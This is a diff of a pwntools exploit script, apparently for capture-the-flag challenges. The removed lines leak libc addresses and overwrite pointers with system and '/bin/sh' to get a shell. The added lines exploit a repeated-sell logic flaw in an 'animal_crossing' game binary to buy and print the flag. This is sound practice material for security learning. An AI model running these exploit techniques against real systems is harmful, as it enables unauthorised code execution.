@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './write'
+local_file  = './animal_crossing'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc.so.6'
+remote_libc = local_libc # '../libc.so.6'
 
 is_local = False
 is_remote = False
@@ -27,7 +27,7 @@ elif len(sys.argv) > 1:
 
 elf = ELF(local_file)
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
 context.arch = elf.arch
 
 se      = lambda data               :p.send(data) 
@@ -46,37 +46,32 @@ def debug(cmd=''):
 
 # info
 # gadget
-prdi = 0x00000000000009e3 # pop rdi ; ret
 
 # elf, libc
 
-ru('puts: ')
-puts = eval(rc(14))
-ru('stack: ')
-stack = eval(rc(14))
+# buy tarantula - 8000
+sla('Choice: ','2')
+sla('6. flag - 420000 bells\n','2')
 
-libcbase = puts - libc.sym['puts']
-info_addr('libcbase',libcbase)
+# sell tarantula 53 times - 8000*53=424000
+for i in range(53):
+    sla('Choice: ','1')
+    sla('5. tarantula - I hate spiders! Price: 8000 bells\n','5')
+    print i
 
-ptr = libcbase+0x619f60 #0x239f68
-info_addr('ptr',ptr)
-system = libcbase+libc.sym['system']
-info_addr('system',system)
-rdi = libcbase+0x619968 #0x239968
-info_addr('rdi',rdi)
+# sell 1,2 (make room in pockets)
+sla('Choice: ','1')
+sla('5. tarantula - I hate spiders! Price: 8000 bells\n','2')
+sla('Choice: ','1')
+sla('5. tarantula - I hate spiders! Price: 8000 bells\n','1')
 
-sl('w')
-sl(str(ptr))
-sl(str(system))
+# buy flag
+sla('Choice: ','2')
+sla('6. flag - 420000 bells\n','6')
 
-sl('w')
-sl(str(rdi))
-sl(str(u64('/bin/sh\0')))
-
-debug('b *$rebase(0x969)')
-sl('q')
-
-# info_addr('tag',addr)
-# log.warning('--------------')
+# print flag
+context.log_level = 'debug'
+sla('Choice: ','1')
 
 p.interactive()
+
